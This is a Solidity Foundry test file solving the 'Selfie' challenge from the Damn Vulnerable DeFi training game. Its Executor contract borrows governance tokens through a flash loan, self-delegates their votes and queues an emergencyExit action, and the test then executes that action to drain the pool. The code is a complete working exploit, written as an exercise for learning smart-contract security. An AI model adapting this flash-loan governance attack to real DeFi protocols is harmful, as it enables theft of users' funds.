// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Executor is IERC3156FlashBorrower {

    SelfiePool immutable internal pool;
    DamnValuableVotes immutable internal token;
    SimpleGovernance immutable internal governance;
    address immutable internal recovery;

    constructor(
        SelfiePool _pool,
        DamnValuableVotes _token,
        SimpleGovernance _governance,
        address _recovery
    ) {
        pool = _pool;
        token = _token;
        governance = _governance;
        recovery = _recovery;
    }

    function execute() public {
        bytes memory emergencyExitEncodedData = abi.encode(
            address(pool),
            0,
            abi.encodeCall(SelfiePool.emergencyExit, (recovery))
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            pool.maxFlashLoan(address(token)),
            emergencyExitEncodedData
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableVotes(token).delegate(address(this));

        (address target, uint128 value, bytes memory actionData) = abi.decode(data, (address, uint128, bytes));

        // Propose an action to drain the funds of the pool to the recovery address
        governance.queueAction(target, value, actionData);

        // Approve pool to take the tokens back
        DamnValuableVotes(token).approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Executor executor = new Executor(pool, token, governance, recovery);
        executor.execute();

        uint256 actionId = governance.getActionCounter();

        vm.warp(block.timestamp + 2 days);

        governance.executeAction(actionId - 1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
